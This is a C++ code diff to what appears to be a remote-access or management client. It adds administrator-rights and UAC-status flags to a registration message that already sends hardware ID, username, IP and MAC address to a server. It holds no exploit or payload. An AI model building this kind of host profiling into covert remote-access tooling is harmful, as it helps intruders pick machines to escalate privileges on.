@@ -175,7 +175,8 @@ std::string Protocol::ReadJson(int timeoutMs) {
 bool Protocol::SendRegister(const char* clientType, const char* hardwareId,
     const char* machineName, const char* osVersion, const char* osArch,
     int cpuCount, long long totalMemory, const char* username,
-    const char* clientVersion, const char* ipAddress, const char* macAddress) {
+    const char* clientVersion, const char* ipAddress, const char* macAddress,
+    bool isAdmin, bool isUacEnabled) {
 
     char json[BUFFER_SIZE];
     snprintf(json, sizeof(json),
@@ -191,7 +192,9 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId,
         "\"username\":\"%s\","
         "\"clientVersion\":\"%s\","
         "\"ipAddress\":\"%s\","
-        "\"macAddress\":\"%s\""
+        "\"macAddress\":\"%s\","
+        "\"isAdmin\":%s,"
+        "\"isUacEnabled\":%s"
         "}",
         Utils::JsonEscape(hardwareId).c_str(),
         clientType,
@@ -203,7 +206,9 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId,
         Utils::JsonEscape(username).c_str(),
         clientVersion,
         ipAddress,
-        macAddress);
+        macAddress,
+        isAdmin ? "true" : "false",
+        isUacEnabled ? "true" : "false");
 
     return SendJson(json);
 }
@@ -217,6 +222,8 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId, cons
     int cpuCount = static_cast<int>(Utils::JsonGetInt(systemInfoJson, "cpuCount"));
     long long totalMemory = Utils::JsonGetInt(systemInfoJson, "totalMemory");
     std::string localIp = Utils::JsonGetString(systemInfoJson, "localIp");
+    bool isAdmin = Utils::JsonGetBool(systemInfoJson, "isAdmin");
+    bool isUacEnabled = Utils::JsonGetBool(systemInfoJson, "uacEnabled");
 
     // Get MAC address from fingerprint
     std::string macAddress = Fingerprint::GetMacAddress();
@@ -224,7 +231,8 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId, cons
     return SendRegister(clientType, hardwareId,
         machineName.c_str(), osVersion.c_str(), architecture.c_str(),
         cpuCount, totalMemory, username.c_str(),
-        CLIENT_VERSION, localIp.c_str(), macAddress.c_str());
+        CLIENT_VERSION, localIp.c_str(), macAddress.c_str(),
+        isAdmin, isUacEnabled);
 }
 
 bool Protocol::SendHeartbeat(long long uptimeSeconds, long long availMemory) {
